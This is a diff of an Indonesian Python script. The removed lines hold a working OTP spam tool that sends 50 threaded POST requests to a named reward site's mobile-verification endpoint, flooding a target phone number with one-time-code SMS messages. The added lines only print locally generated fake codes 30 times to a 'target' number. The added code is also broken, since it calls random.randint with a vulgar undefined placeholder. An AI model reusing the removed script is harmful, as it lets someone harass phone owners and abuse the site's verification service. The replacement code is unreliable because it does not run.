@@ -1,50 +1,25 @@
-import requests
-import threading
 import time
-import os
+import random
 
-def send_otp(nomor):
-    try:
-        url = "https://id.jagreward.com/member/verify-mobile"
-        headers = {
-            "User-Agent": "Mozilla/5.0",
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        data = {
-            "mobile": nomor
-        }
-        r = requests.post(url, headers=headers, data=data)
-        if r.status_code == 200:
-            print(f"Success Send to {nomor}")
-        else:
-            print(f"Gagal Kirim [{r.status_code}]")
-    except Exception as e:
-        print(f"Error: {e}")
+def generate_otp():
+    return random.randint(KONTOL)
 
-def start_spam(nomor, jumlah=50):
-    threads = []
-    for _ in range(jumlah):
-        t = threading.Thread(target=send_otp, args=(nomor,))
-        t.start()
-        threads.append(t)
-        time.sleep(0.2)  # total ~10 detik untuk 50 thread
+def kirim_otp(nomor):
+    otp = generate_otp()
+    print(f"[+] OTP Terkirim ke {nomor}: {otp}")
+    # Di sini bisa ditambahkan pengiriman via API resmi
 
-    for t in threads:
-        t.join()
+def main():
+    print("=== Sistem Kirim OTP Via SMS===")
+    nomor = input("Masukkan Nomor Target: ")
+    max_kirim = 30
+    delay_per_kirim = 1  # detik
 
-    print("\nSelesai mengirim spam!")
+    for i in range(max_kirim):
+        kirim_otp(nomor)
+        time.sleep(delay_per_kirim)
 
-def menu():
-    os.system("clear")
-    print("=== SPAM OTP - FROGZZ ===")
-    print("[1] Spam OTP Via Nomor Handphone")
-    pilihan = input("Pilih Menu: ")
-    if pilihan == "1":
-        nomor = input("Nomor Target (cth: 628xxxxxx): ")
-        print(f"\nProcess Send To {nomor}\n")
-        start_spam(nomor)
-    else:
-        print("Pilihan tidak tersedia.")
+    print(f"[-] Selesai kirim {max_kirim} OTP ke {nomor}")
 
 if __name__ == "__main__":
-    menu()
+    main()
